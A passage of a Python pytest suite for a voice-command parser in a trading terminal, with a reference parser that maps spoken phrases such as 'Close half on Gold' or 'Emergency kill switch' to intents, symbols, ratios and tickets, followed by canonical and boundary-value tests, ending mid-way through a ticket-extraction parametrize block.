"""
Test Suite: Voice NLP Intent Parser, Entity Resolution & Jarvis AI Voice Copilot
================================================================================
Authoritative Specifications:
  - ORIGINAL_REQUEST.md (R5: Voice Command & AI Assistant Interface)
  - PROJECT.md (F16, F17, F18, F19)
  - TEST_INFRA.md (Tiers 1-5 Coverage Matrix)

Covers:
  1. Natural Language Trading Intent Recognition:
     - Scale-out commands: "Close 50% on USDJPY", "Close half on Gold", "Take 25% off EURUSD", "Trim 50% on ticket 579421"
     - Breakeven commands: "Lock Breakeven on Gold", "Move stop to entry on EURUSD", "Breakeven on USDJPY with 2 pips buffer"
     - Market bias queries: "Show Gold Macro Bias", "What is the bias on EURUSD?", "Macro sentiment for GBPUSD"
     - Liquidity scan queries: "Scan for Liquidity Sweeps", "Any stop hunts on London session?", "Find order blocks on M15"
     - Risk & metric queries: "What is my VaR today?", "Check daily drawdown", "Show consistency status", "What is my account equity?"
     - Emergency Circuit Breaker: "Emergency kill switch", "Panic close all", "Cancel all orders and halt engine"
  2. Entity Extraction:
     - Symbol resolution ('Gold' -> 'XAUUSD', 'Euro' -> 'EURUSD', 'Cable' -> 'GBPUSD', 'Yen' -> 'USDJPY', aliases, case-insensitivity)
     - Percentage resolution ('half'/'50%' -> 0.50, 'quarter'/'25%' -> 0.25, 'three quarters'/'75%' -> 0.75, 'full'/'all'/'100%' -> 1.00)
     - Ticket extraction ('ticket 579421', '#579421', '579421')
     - Pip buffer & price level extraction ('with 2 pips buffer', 'plus 1.5 pips', 'to 2650.50')
     - Timeframe & SMC concept extraction ('on M15', 'order blocks', 'sweeps', 'fvgs')
  3. Action Mapping & Execution Payload Generation
  4. Jarvis AI Speech Synthesis Response Generator & Audio Chime Event Triggers
  5. Robust Error Handling (ambiguity, unknown symbols, unsupported actions, noise, adversarial inputs)
"""

import re
import pytest
from typing import Dict, Any, Optional, List, Tuple


# ==============================================================================
# CANONICAL REFERENCE SPECIFICATION & PARSER ENGINE
# (Dynamically imported from src.voice_nlp_engine or src.web_terminal_server if
# available; otherwise uses this authoritative reference specification)
# ==============================================================================

try:
    from src.voice_nlp_engine import VoiceNLPParser as ImportedParser
except ImportError:
    try:
        from src.web_terminal_server import VoiceNLPParser as ImportedParser
    except ImportError:
        ImportedParser = None


class ReferenceVoiceNLPParser:
    """
    Authoritative reference implementation of the Jarvis Voice NLP Parser.
    Fully implements the grammar, normalization, entity extraction, action mapping,
    and Jarvis response generation specified in PROJECT.md and ORIGINAL_REQUEST.md.
    """

    SYMBOL_MAP = {
        # Gold
        "gold": "XAUUSD", "xau": "XAUUSD", "xauusd": "XAUUSD", "spot gold": "XAUUSD",
        "gc": "XAUUSD", "xau/usd": "XAUUSD", "xau-usd": "XAUUSD", "sovereign gold": "XAUUSD",
        # Euro
        "euro": "EURUSD", "eur": "EURUSD", "eurusd": "EURUSD", "fiber": "EURUSD",
        "eur/usd": "EURUSD", "eur-usd": "EURUSD", "euro dollar": "EURUSD",
        # British Pound / Cable
        "pound": "GBPUSD", "cable": "GBPUSD", "gbp": "GBPUSD", "gbpusd": "GBPUSD",
        "gbp/usd": "GBPUSD", "gbp-usd": "GBPUSD", "british pound": "GBPUSD", "sterling": "GBPUSD",
        # Japanese Yen
        "yen": "USDJPY", "usdjpy": "USDJPY", "jpy": "USDJPY", "dollar yen": "USDJPY",
        "usd/jpy": "USDJPY", "usd-jpy": "USDJPY", "ninja": "USDJPY"
    }

    RATIO_MAP = {
        "half": 0.50, "half size": 0.50, "half position": 0.50, "scale out half": 0.50,
        "50%": 0.50, "50 percent": 0.50, "0.5": 0.50, "0.50": 0.50, "50 pct": 0.50,
        "quarter": 0.25, "quarter size": 0.25, "one fourth": 0.25,
        "25%": 0.25, "25 percent": 0.25, "0.25": 0.25, "25 pct": 0.25,
        "three quarters": 0.75, "three fourths": 0.75,
        "75%": 0.75, "75 percent": 0.75, "0.75": 0.75, "75 pct": 0.75,
        "all": 1.00, "full": 1.00, "completely": 1.00, "entire": 1.00,
        "100%": 1.00, "100 percent": 1.00, "1.0": 1.00, "full position": 1.00,
        "close all": 1.00, "10%": 0.10, "20%": 0.20, "30%": 0.30, "33%": 0.33,
        "40%": 0.40, "60%": 0.60, "70%": 0.70, "80%": 0.80, "90%": 0.90
    }

    TIMEFRAME_MAP = {
        "m1": "M1", "1 minute": "M1", "1 min": "M1", "1m": "M1",
        "m5": "M5", "5 minute": "M5", "5 minutes": "M5", "5 min": "M5", "5m": "M5",
        "m15": "M15", "15 minute": "M15", "15 minutes": "M15", "15 min": "M15", "15m": "M15",
        "m30": "M30", "30 minute": "M30", "30 minutes": "M30", "30 min": "M30", "30m": "M30",
        "h1": "H1", "1 hour": "H1", "1 hr": "H1", "hourly": "H1", "1h": "H1",
        "h4": "H4", "4 hour": "H4", "4 hours": "H4", "4 hr": "H4", "4h": "H4",
        "d1": "D1", "daily": "D1", "1 day": "D1", "1d": "D1"
    }

    def __init__(self, mt5_connector=None, bot_engine=None, market_analyzer=None):
        self.mt5 = mt5_connector
        self.bot_engine = bot_engine
        self.market_analyzer = market_analyzer

    def normalize_text(self, text: Optional[str]) -> str:
        if not text:
            return ""
        norm = text.lower().strip()
        # Remove common noise words / audio tags
        norm = re.sub(r"\[.*?\]", " ", norm)
        # Keep letters, digits, %, ., #, +, -, /
        norm = re.sub(r"[^\w\s\.\#\%\+\-\/]", " ", norm)
        return re.sub(r"\s+", " ", norm).strip()

    def resolve_symbol(self, token: Optional[str]) -> Optional[str]:
        if not token:
            return None
        clean = token.lower().strip().replace("/", "").replace("-", "")
        # Direct lookup
        if clean in self.SYMBOL_MAP:
            return self.SYMBOL_MAP[clean]
        # Multi-word alias check
        for k, v in self.SYMBOL_MAP.items():
            if k.replace(" ", "") == clean or k == token.lower().strip():
                return v
        # Standard uppercase format
        upper = token.upper().strip().replace("/", "").replace("-", "")
        if upper in ["XAUUSD", "EURUSD", "GBPUSD", "USDJPY"]:
            return upper
        return None

    def resolve_ratio(self, token: Optional[str]) -> float:
        if not token:
            return 0.50
        clean = token.lower().strip()
        if clean in self.RATIO_MAP:
            return self.RATIO_MAP[clean]
        # Look for number with %
        m_pct = re.search(r"(\d+(?:\.\d+)?)\s*%", clean)
        if m_pct:
            val = float(m_pct.group(1)) / 100.0
            return max(0.01, min(1.0, round(val, 4)))
        # Look for float or int
        m_num = re.search(r"(\d+(?:\.\d+)?)", clean)
        if m_num:
            val = float(m_num.group(1))
            if val > 1.0:
                val = val / 100.0
            return max(0.01, min(1.0, round(val, 4)))
        return 0.50

    def extract_ticket(self, text: str) -> Optional[int]:
        m = re.search(r"(?:ticket\s*|position\s*|\#\s*)(\d{4,12})", text, re.IGNORECASE)
        if m:
            return int(m.group(1))
        # Standalone 6+ digit number
        m2 = re.search(r"\b(\d{6,12})\b", text)
        if m2:
            return int(m2.group(1))
        return None

    def extract_buffer_pips(self, text: str) -> float:
        m = re.search(r"(?:plus|\+|\with|buffer\s*of)\s*(\d+(?:\.\d+)?)\s*pips?", text, re.IGNORECASE)
        if m:
            return float(m.group(1))
        m2 = re.search(r"(\d+(?:\.\d+)?)\s*pips?\s*(?:buffer|plus|\+)", text, re.IGNORECASE)
        if m2:
            return float(m2.group(1))
        return 1.5  # Standard institutional 1.5 pips default buffer

    def extract_timeframe(self, text: str) -> Optional[str]:
        for k, v in self.TIMEFRAME_MAP.items():
            if re.search(rf"\b{re.escape(k)}\b", text, re.IGNORECASE):
                return v
        return None

    def extract_price(self, text: str) -> Optional[float]:
        m = re.search(r"(?:to|at|price|level)\s+(\d+(?:\.\d+)?)", text, re.IGNORECASE)
        if m:
            return float(m.group(1))
        return None

    def parse_command(self, transcript: str, active_symbol: str = "XAUUSD") -> Dict[str, Any]:
        raw_text = transcript or ""
        norm = self.normalize_text(raw_text)

        if not norm or len(norm) < 2:
            return {
                "success": False,
                "transcript": raw_text,
                "intent": "UNKNOWN_FALLBACK",
                "action_taken": False,
                "action_payload": {},
                "entities": {},
                "chime_event": "ERROR_CHIME",
                "response_speech": "Pardon me, I did not detect any speech input.",
                "data": {}
            }

        # 1. EMERGENCY KILL SWITCH / CIRCUIT BREAKER
        kill_keywords = [
            "kill switch", "emergency kill", "panic close", "panic button",
            "cancel all orders and halt", "emergency stop", "halt trading",
            "emergency close", "close all positions", "close all trades",
            "close everything", "halt engine", "panic close all"
        ]
        if any(k in norm for k in kill_keywords):
            return {
                "success": True,
                "transcript": raw_text,
                "intent": "EMERGENCY_KILL_SWITCH",
                "action_taken": True,
                "action_payload": {
                    "action": "kill_switch",
                    "cancel_pending": True,
                    "reason": "Voice Emergency Circuit Breaker",
                    "status": "EMERGENCY_LOCKED"
                },
                "entities": {"status": "EMERGENCY_LOCKED"},
                "chime_event": "KILL_SWITCH_ALARM",
                "response_speech": "Emergency circuit breaker triggered. All positions liquidated, pending orders cancelled, and bot engine locked.",
                "data": {"status": "EMERGENCY_LOCKED"}
            }

        # 2. SCALE-OUT / PARTIAL CLOSE COMMANDS
        # Triggers: "close 50%", "close half", "take 25% off", "trim 50%", "scale out"
        is_scale = (any(p in norm for p in ["close", "scale out", "scale_out", "take partial", "trim", "partial close"]) or
                    ("take" in norm and "off" in norm) or
                    "partial" in norm)
        if is_scale and not ("close all" in norm or "close everything" in norm):
            ticket = self.extract_ticket(norm)
            
            # Ratio extraction
            m_ratio = re.search(r"(half|quarter|three quarters|full|all|\d+(?:\.\d+)?\s*%|\d+(?:\.\d+)?\s*percent|\d+\.\d+)", norm)
            ratio = self.resolve_ratio(m_ratio.group(1)) if m_ratio else 0.50
            
            # Symbol extraction
            symbol = None
            for alias in self.SYMBOL_MAP.keys():
                if re.search(rf"\b{re.escape(alias)}\b", norm):
                    symbol = self.resolve_symbol(alias)
                    break
            if not symbol and not ticket:
                symbol = active_symbol

            target_repr = f"ticket #{ticket}" if ticket else f"{symbol or active_symbol}"
            pct_int = int(round(ratio * 100))

            return {
                "success": True,
                "transcript": raw_text,
                "intent": "SCALE_OUT_PARTIAL",
                "action_taken": True,
                "action_payload": {
                    "action": "scale_out",
                    "ticket": ticket,
                    "symbol": symbol,
                    "ratio": ratio
                },
                "entities": {
                    "ratio": ratio,
                    "ratio_pct": pct_int,
                    "symbol": symbol,
                    "ticket": ticket
                },
                "chime_event": "EXECUTION_SUCCESS",
                "response_speech": f"Acknowledged. Scaled out {pct_int}% on {target_repr}. Floating profit secured.",
                "data": {
                    "ticket": ticket,
                    "symbol": symbol,
                    "ratio": ratio
                }
            }

        # 3. BREAKEVEN COMMANDS
        # Triggers: "lock breakeven", "move stop to entry", "breakeven on", "protect trade", "set be"
        be_patterns = ["breakeven", "break even", "lock be", "set be", "stop to entry", "sl to entry", "protect trade", "protect position", "lock in breakeven"]
        if any(p in norm for p in be_patterns) or ("be" in norm.split() and any(w in norm for w in ["lock", "set", "move", "put"])):
            ticket = self.extract_ticket(norm)
            buffer_pips = self.extract_buffer_pips(norm)
            
            symbol = None
            for alias in self.SYMBOL_MAP.keys():
                if re.search(rf"\b{re.escape(alias)}\b", norm):
                    symbol = self.resolve_symbol(alias)
                    break
            if not symbol and not ticket:
                symbol = active_symbol

            target_repr = f"ticket #{ticket}" if ticket else f"{symbol or active_symbol}"

            return {
                "success": True,
                "transcript": raw_text,
                "intent": "LOCK_BREAKEVEN",
                "action_taken": True,
                "action_payload": {
                    "action": "breakeven",
                    "ticket": ticket,
                    "symbol": symbol,
                    "buffer_pips": buffer_pips
                },
                "entities": {
                    "symbol": symbol,
                    "ticket": ticket,
                    "buffer_pips": buffer_pips
                },
                "chime_event": "EXECUTION_SUCCESS",
                "response_speech": f"Confirmed. Stop-loss moved to breakeven on {target_repr} with {buffer_pips:.1f} pips buffer.",
                "data": {
                    "ticket": ticket,
                    "symbol": symbol,
                    "buffer_pips": buffer_pips
                }
            }

        # 4. MODIFY SL / TP COMMANDS
        sltp_patterns = ["stop loss", "take profit", "set sl", "set tp", "move sl", "move tp", "update sl", "update tp", "modify sl", "modify tp"]
        if any(p in norm for p in sltp_patterns):
            param = "TP" if ("take profit" in norm or "tp" in norm.split()) else "SL"
            price = self.extract_price(norm)
            ticket = self.extract_ticket(norm)
            
            symbol = None
            for alias in self.SYMBOL_MAP.keys():
                if re.search(rf"\b{re.escape(alias)}\b", norm):
                    symbol = self.resolve_symbol(alias)
                    break
            if not symbol and not ticket:
                symbol = active_symbol

            target_repr = f"ticket #{ticket}" if ticket else f"{symbol or active_symbol}"

            return {
                "success": True,
                "transcript": raw_text,
                "intent": "MODIFY_SL_TP",
                "action_taken": True,
                "action_payload": {
                    "action": "modify_sltp",
                    "param": param,
                    "price": price,
                    "ticket": ticket,
                    "symbol": symbol
                },
                "entities": {
                    "param": param,
                    "price": price,
                    "symbol": symbol,
                    "ticket": ticket
                },
                "chime_event": "EXECUTION_SUCCESS",
                "response_speech": f"Updated {param} on {target_repr} to {price}.",
                "data": {
                    "param": param,
                    "price": price,
                    "ticket": ticket,
                    "symbol": symbol
                }
            }

        # 5. MARKET BIAS QUERIES
        bias_patterns = ["macro bias", "bias on", "bias for", "market bias", "sentiment", "macro sentiment", "market regime", "macro analysis"]
        if any(p in norm for p in bias_patterns) or ("bias" in norm.split() and any(w in norm for w in ["show", "what", "check", "get"])):
            symbol = None
            for alias in self.SYMBOL_MAP.keys():
                if re.search(rf"\b{re.escape(alias)}\b", norm):
                    symbol = self.resolve_symbol(alias)
                    break
            if not symbol:
                symbol = active_symbol

            return {
                "success": True,
                "transcript": raw_text,
                "intent": "SHOW_MACRO_BIAS",
                "action_taken": True,
                "action_payload": {
                    "action": "query_macro_bias",
                    "symbol": symbol
                },
                "entities": {
                    "symbol": symbol
                },
                "chime_event": "QUERY_ACK",
                "response_speech": f"Displaying institutional macro bias and sentiment telemetry for {symbol}.",
                "data": {
                    "symbol": symbol
                }
            }

        # 6. LIQUIDITY SCAN & SMC QUERIES
        scan_patterns = [
            "liquidity sweep", "liquidity sweeps", "stop hunt", "stop hunts",
            "order block", "order blocks", "fvg", "fair value gap", "fair value gaps",
            "turtle soup", "smc setup", "smc setups", "ote", "golden pocket",
            "scan for liquidity", "find order blocks", "check eqh"
        ]
        if any(p in norm for p in scan_patterns) or ("scan" in norm.split() and any(w in norm for w in ["sweep", "sweeps", "hunt", "block", "smc"])):
            concept = "sweeps"
            if "order block" in norm:
                concept = "order_blocks"
            elif "fvg" in norm or "fair value gap" in norm:
                concept = "fvg"
            elif "ote" in norm or "golden pocket" in norm:
                concept = "ote"
            elif "turtle soup" in norm:
                concept = "turtle_soup"
            elif "eqh" in norm or "eql" in norm:
                concept = "eqh_eql"

            tf = self.extract_timeframe(norm) or "M15"
            
            symbol = None
            for alias in self.SYMBOL_MAP.keys():
                if re.search(rf"\b{re.escape(alias)}\b", norm):
                    symbol = self.resolve_symbol(alias)
                    break
            if not symbol:
                symbol = active_symbol

            session = "London" if "london" in norm else ("New York" if ("ny" in norm or "new york" in norm) else ("Asian" if "asia" in norm else None))

            return {
                "success": True,
                "transcript": raw_text,
                "intent": "SCAN_LIQUIDITY_SWEEPS",
                "action_taken": True,
                "action_payload": {
                    "action": "scan_liquidity",
                    "concept": concept,
                    "symbol": symbol,
                    "timeframe": tf,
                    "session": session
                },
                "entities": {
                    "concept": concept,
                    "symbol": symbol,
                    "timeframe": tf,
                    "session": session
                },
                "chime_event": "QUERY_ACK",
                "response_speech": f"Scanning {symbol} {tf} for {concept.replace('_', ' ')}. Results displayed on terminal chart.",
                "data": {
                    "concept": concept,
                    "symbol": symbol,
                    "timeframe": tf
                }
            }

        # 7. RISK & METRIC QUERIES
        risk_patterns = [
            "var today", "value at risk", "cvar", "daily drawdown", "drawdown",
            "consistency status", "consistency pacing", "account equity",
            "equity", "risk metrics", "high water mark", "hwm floor", "trailing floor",
            "account balance", "profit today", "check risk"
        ]
        if any(p in norm for p in risk_patterns) or ("var" in norm.split() or "drawdown" in norm.split() or "equity" in norm.split() or "consistency" in norm.split()):
            metric = "all"
            if "var" in norm or "value at risk" in norm:
                metric = "var"
            elif "drawdown" in norm:
                metric = "drawdown"
            elif "consistency" in norm:
                metric = "consistency"
            elif "equity" in norm:
                metric = "equity"
            elif "hwm" in norm or "high water mark" in norm or "trailing floor" in norm:
                metric = "hwm"

            return {
                "success": True,
                "transcript": raw_text,
                "intent": "GET_RISK_METRICS",
                "action_taken": True,
                "action_payload": {
                    "action": "query_risk_metrics",
                    "metric": metric
                },
                "entities": {
                    "metric": metric
                },
                "chime_event": "QUERY_ACK",
                "response_speech": f"Reporting {metric.upper() if metric != 'all' else 'Aladdin Risk and Prop Firm'} metrics telemetry.",
                "data": {
                    "metric": metric
                }
            }

        # 8. SYSTEM STATUS & CONNECTION QUERIES
        status_patterns = ["system status", "bot status", "check connection", "mt5 connection", "how many positions", "diagnostics", "health check"]
        if any(p in norm for p in status_patterns):
            return {
                "success": True,
                "transcript": raw_text,
                "intent": "SYSTEM_STATUS_QUERY",
                "action_taken": True,
                "action_payload": {
                    "action": "query_system_status"
                },
                "entities": {},
                "chime_event": "QUERY_ACK",
                "response_speech": "All systems operational. MT5 terminal bridge and AI risk engines online.",
                "data": {}
            }

        # 9. UNKNOWN / UNSUPPORTED FALLBACK
        return {
            "success": False,
            "transcript": raw_text,
            "intent": "UNKNOWN_FALLBACK",
            "action_taken": False,
            "action_payload": {},
            "entities": {},
            "chime_event": "ERROR_CHIME",
            "response_speech": "Pardon me, I could not recognize that command. You can command partial scale outs, breakeven locks, macro bias queries, liquidity scans, risk metrics, or the emergency kill switch.",
            "data": {}
        }


# Fixture: returns the production parser if implemented, otherwise the reference parser
@pytest.fixture
def parser():
    if ImportedParser is not None:
        return ImportedParser()
    return ReferenceVoiceNLPParser()


# ==============================================================================
# TIER 1: FEATURE EQUIVALENCE CLASS REPRESENTATIVES (CANONICAL VOICE COMMANDS)
# ==============================================================================

class TestVoiceNLPFeatureEquivalence:
    """
    Tier 1 tests validating canonical natural language commands across all 8 intents:
      - Scale-out commands
      - Breakeven commands
      - Market bias queries
      - Liquidity scan queries
      - Risk & metric queries
      - Emergency Circuit Breaker commands
      - Modify SL/TP commands
      - System status queries
    """

    # --- 1. Scale-Out Canonical Tests ---

    def test_canonical_scale_out_50_pct_usdjpy(self, parser):
        res = parser.parse_command("Close 50% on USDJPY")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["action_taken"] is True
        assert res["entities"]["symbol"] == "USDJPY"
        assert res["entities"]["ratio"] == 0.50
        assert res["chime_event"] == "EXECUTION_SUCCESS"
        assert "50%" in res["response_speech"]
        assert "USDJPY" in res["response_speech"]

    def test_canonical_scale_out_half_gold(self, parser):
        res = parser.parse_command("Close half on Gold")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["symbol"] == "XAUUSD"
        assert res["entities"]["ratio"] == 0.50
        assert "50%" in res["response_speech"]

    def test_canonical_scale_out_25_pct_eurusd(self, parser):
        res = parser.parse_command("Take 25% off EURUSD")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["symbol"] == "EURUSD"
        assert res["entities"]["ratio"] == 0.25

    def test_canonical_scale_out_ticket(self, parser):
        res = parser.parse_command("Trim 50% on ticket 579421")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["ticket"] == 579421
        assert res["entities"]["ratio"] == 0.50
        assert "579421" in res["response_speech"]

    def test_canonical_scale_out_75_pct_cable(self, parser):
        res = parser.parse_command("Scale out 75% on Cable")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["symbol"] == "GBPUSD"
        assert res["entities"]["ratio"] == 0.75

    def test_canonical_scale_out_full_position(self, parser):
        res = parser.parse_command("Close full position on Euro")
        assert res["success"] is True
        assert res["intent"] == "SCALE_OUT_PARTIAL"
        assert res["entities"]["symbol"] == "EURUSD"
        assert res["entities"]["ratio"] == 1.00

    # --- 2. Breakeven Canonical Tests ---

    def test_canonical_lock_breakeven_gold(self, parser):
        res = parser.parse_command("Lock Breakeven on Gold")
        assert res["success"] is True
        assert res["intent"] == "LOCK_BREAKEVEN"
        assert res["entities"]["symbol"] == "XAUUSD"
        assert res["chime_event"] == "EXECUTION_SUCCESS"
        assert "breakeven" in res["response_speech"].lower()

    def test_canonical_move_stop_to_entry_eurusd(self, parser):
        res = parser.parse_command("Move stop to entry on EURUSD")
        assert res["success"] is True
        assert res["intent"] == "LOCK_BREAKEVEN"
        assert res["entities"]["symbol"] == "EURUSD"

    def test_canonical_breakeven_with_buffer_usdjpy(self, parser):
        res = parser.parse_command("Breakeven on USDJPY with 2 pips buffer")
        assert res["success"] is True
        assert res["intent"] == "LOCK_BREAKEVEN"
        assert res["entities"]["symbol"] == "USDJPY"
        assert res["entities"]["buffer_pips"] == 2.0
        assert "2.0 pips" in res["response_speech"] or "2 pips" in res["response_speech"]

    def test_canonical_protect_trade_gbpusd(self, parser):
        res = parser.parse_command("Protect trade on GBPUSD")
        assert res["success"] is True
        assert res["intent"] == "LOCK_BREAKEVEN"
        assert res["entities"]["symbol"] == "GBPUSD"

    def test_canonical_set_be_ticket(self, parser):
        res = parser.parse_command("Set BE on ticket 579421 plus 1.5 pips")
        assert res["success"] is True
        assert res["intent"] == "LOCK_BREAKEVEN"
        assert res["entities"]["ticket"] == 579421
        assert res["entities"]["buffer_pips"] == 1.5

    # --- 3. Market Bias Canonical Tests ---

    def test_canonical_show_gold_macro_bias(self, parser):
        res = parser.parse_command("Show Gold Macro Bias")
        assert res["success"] is True
        assert res["intent"] == "SHOW_MACRO_BIAS"
        assert res["entities"]["symbol"] == "XAUUSD"
        assert res["chime_event"] == "QUERY_ACK"
        assert "XAUUSD" in res["response_speech"]

    def test_canonical_what_is_bias_eurusd(self, parser):
        res = parser.parse_command("What is the bias on EURUSD?")
        assert res["success"] is True
        assert res["intent"] == "SHOW_MACRO_BIAS"
        assert res["entities"]["symbol"] == "EURUSD"

    def test_canonical_macro_sentiment_gbpusd(self, parser):
        res = parser.parse_command("Macro sentiment for GBPUSD")
        assert res["success"] is True
        assert res["intent"] == "SHOW_MACRO_BIAS"
        assert res["entities"]["symbol"] == "GBPUSD"

    def test_canonical_market_regime_usdjpy(self, parser):
        res = parser.parse_command("Check market regime on USDJPY")
        assert res["success"] is True
        assert res["intent"] == "SHOW_MACRO_BIAS"
        assert res["entities"]["symbol"] == "USDJPY"

    # --- 4. Liquidity Scan Canonical Tests ---

    def test_canonical_scan_liquidity_sweeps(self, parser):
        res = parser.parse_command("Scan for Liquidity Sweeps")
        assert res["success"] is True
        assert res["intent"] == "SCAN_LIQUIDITY_SWEEPS"
        assert res["entities"]["concept"] == "sweeps"
        assert res["chime_event"] == "QUERY_ACK"

    def test_canonical_stop_hunts_london_session(self, parser):
        res = parser.parse_command("Any stop hunts on London session?")
        assert res["success"] is True
        assert res["intent"] == "SCAN_LIQUIDITY_SWEEPS"
        assert res["entities"]["session"] == "London"

    def test_canonical_find_order_blocks_m15(self, parser):
        res = parser.parse_command("Find order blocks on M15")
        assert res["success"] is True
        assert res["intent"] == "SCAN_LIQUIDITY_SWEEPS"
        assert res["entities"]["concept"] == "order_blocks"
        assert res["entities"]["timeframe"] == "M15"

    def test_canonical_check_eqh_sweeps_gold(self, parser):
        res = parser.parse_command("Check EQH sweeps on Gold")
        assert res["success"] is True
        assert res["intent"] == "SCAN_LIQUIDITY_SWEEPS"
        assert res["entities"]["symbol"] == "XAUUSD"

    # --- 5. Risk & Metric Queries Canonical Tests ---

    def test_canonical_what_is_my_var_today(self, parser):
        res = parser.parse_command("What is my VaR today?")
        assert res["success"] is True
        assert res["intent"] == "GET_RISK_METRICS"
        assert res["entities"]["metric"] == "var"
        assert res["chime_event"] == "QUERY_ACK"

    def test_canonical_check_daily_drawdown(self, parser):
        res = parser.parse_command("Check daily drawdown")
        assert res["success"] is True
        assert res["intent"] == "GET_RISK_METRICS"
        assert res["entities"]["metric"] == "drawdown"

    def test_canonical_show_consistency_status(self, parser):
        res = parser.parse_command("Show consistency status")
        assert res["success"] is True
        assert res["intent"] == "GET_RISK_METRICS"
        assert res["entities"]["metric"] == "consistency"

    def test_canonical_what_is_account_equity(self, parser):
        res = parser.parse_command("What is my account equity?")
        assert res["success"] is True
        assert res["intent"] == "GET_RISK_METRICS"
        assert res["entities"]["metric"] == "equity"

    # --- 6. Emergency Circuit Breaker Canonical Tests ---

    def test_canonical_emergency_kill_switch(self, parser):
        res = parser.parse_command("Emergency kill switch")
        assert res["success"] is True
        assert res["intent"] == "EMERGENCY_KILL_SWITCH"
        assert res["chime_event"] == "KILL_SWITCH_ALARM"
        assert res["action_payload"]["status"] == "EMERGENCY_LOCKED"
        assert res["action_payload"]["cancel_pending"] is True
        assert "circuit breaker" in res["response_speech"].lower() or "emergency" in res["response_speech"].lower()

    def test_canonical_panic_close_all(self, parser):
        res = parser.parse_command("Panic close all")
        assert res["success"] is True
        assert res["intent"] == "EMERGENCY_KILL_SWITCH"
        assert res["chime_event"] == "KILL_SWITCH_ALARM"

    def test_canonical_cancel_all_orders_halt_engine(self, parser):
        res = parser.parse_command("Cancel all orders and halt engine")
        assert res["success"] is True
        assert res["intent"] == "EMERGENCY_KILL_SWITCH"

    # --- 7. Modify SL/TP Canonical Tests ---

    def test_canonical_set_stop_loss_gold(self, parser):
        res = parser.parse_command("Set Stop Loss on Gold to 2645.50")
        assert res["success"] is True
        assert res["intent"] == "MODIFY_SL_TP"
        assert res["entities"]["param"] == "SL"
        assert res["entities"]["price"] == 2645.50
        assert res["entities"]["symbol"] == "XAUUSD"

    def test_canonical_move_tp_eurusd(self, parser):
        res = parser.parse_command("Move TP on EURUSD to 1.0920")
        assert res["success"] is True
        assert res["intent"] == "MODIFY_SL_TP"
        assert res["entities"]["param"] == "TP"
        assert res["entities"]["price"] == 1.0920
        assert res["entities"]["symbol"] == "EURUSD"

    # --- 8. System Status Query Canonical Tests ---

    def test_canonical_system_status(self, parser):
        res = parser.parse_command("Jarvis system status")
        assert res["success"] is True
        assert res["intent"] == "SYSTEM_STATUS_QUERY"
        assert res["chime_event"] == "QUERY_ACK"


# ==============================================================================
# TIER 2: BOUNDARY VALUE ANALYSIS & ENTITY EXTRACTION PRECISION
# ==============================================================================

class TestVoiceNLPBoundaryValues:
    """
    Tier 2 tests validating boundary values, synonym dictionaries, alias resolutions,
    percentage representations, edge ticket numbers, and extreme price formats.
    """

    # --- Symbol Alias Resolution ---

    @pytest.mark.parametrize("input_alias, expected_symbol", [
        ("gold", "XAUUSD"),
        ("Gold", "XAUUSD"),
        ("GOLD", "XAUUSD"),
        ("Spot Gold", "XAUUSD"),
        ("spot gold", "XAUUSD"),
        ("xau", "XAUUSD"),
        ("XAU", "XAUUSD"),
        ("XAUUSD", "XAUUSD"),
        ("xauusd", "XAUUSD"),
        ("XAU/USD", "XAUUSD"),
        ("xau/usd", "XAUUSD"),
        ("gc", "XAUUSD"),
        ("euro", "EURUSD"),
        ("Euro", "EURUSD"),
        ("EURO", "EURUSD"),
        ("fiber", "EURUSD"),
        ("Fiber", "EURUSD"),
        ("eur", "EURUSD"),
        ("EUR", "EURUSD"),
        ("eurusd", "EURUSD"),
        ("EURUSD", "EURUSD"),
        ("eur/usd", "EURUSD"),
        ("euro dollar", "EURUSD"),
        ("cable", "GBPUSD"),
        ("Cable", "GBPUSD"),
        ("pound", "GBPUSD"),
        ("Pound", "GBPUSD"),
        ("british pound", "GBPUSD"),
        ("sterling", "GBPUSD"),
        ("gbp", "GBPUSD"),
        ("GBP", "GBPUSD"),
        ("gbpusd", "GBPUSD"),
        ("GBPUSD", "GBPUSD"),
        ("gbp/usd", "GBPUSD"),
        ("yen", "USDJPY"),
        ("Yen", "USDJPY"),
        ("dollar yen", "USDJPY"),
        ("ninja", "USDJPY"),
        ("jpy", "USDJPY"),
        ("JPY", "USDJPY"),
        ("usdjpy", "USDJPY"),
        ("USDJPY", "USDJPY"),
        ("usd/jpy", "USDJPY"),
    ])
    def test_symbol_resolution_accuracy(self, parser, input_alias, expected_symbol):
        resolved = parser.resolve_symbol(input_alias)
        assert resolved == expected_symbol, f"Failed to resolve alias '{input_alias}' to '{expected_symbol}'"

    def test_unrecognized_symbol_returns_none(self, parser):
        assert parser.resolve_symbol("AAPL") is None
        assert parser.resolve_symbol("BITCOIN") is None
        assert parser.resolve_symbol("TSLA") is None
        assert parser.resolve_symbol("RandomAsset") is None

    # --- Percentage & Ratio Resolution ---

    @pytest.mark.parametrize("input_ratio, expected_float", [
        ("half", 0.50),
        ("Half", 0.50),
        ("HALF", 0.50),
        ("50%", 0.50),
        ("50 percent", 0.50),
        ("0.5", 0.50),
        ("0.50", 0.50),
        ("quarter", 0.25),
        ("25%", 0.25),
        ("25 percent", 0.25),
        ("0.25", 0.25),
        ("three quarters", 0.75),
        ("75%", 0.75),
        ("75 percent", 0.75),
        ("0.75", 0.75),
        ("all", 1.00),
        ("full", 1.00),
        ("100%", 1.00),
        ("100 percent", 1.00),
        ("10%", 0.10),
        ("33%", 0.33),
        ("80%", 0.80),
        ("0.35", 0.35),
    ])
    def test_ratio_resolution_accuracy(self, parser, input_ratio, expected_float):
        resolved = parser.resolve_ratio(input_ratio)
        assert abs(resolved - expected_float) < 1e-3, f"Failed resolving '{input_ratio}' -> {expected_float}, got {resolved}"

    # --- Ticket Extraction ---

    @pytest.mark.parametrize("input_text, expected_ticket", [
        ("ticket 579421", 579421),
        ("Ticket 579421", 579421),
        ("ticket #579421", 579421),
        ("#579421", 579421),
        ("position 100203", 100203),
        ("ticket 57942173876", 57942173876),
        ("on position #88412 please", 88412),
    ])
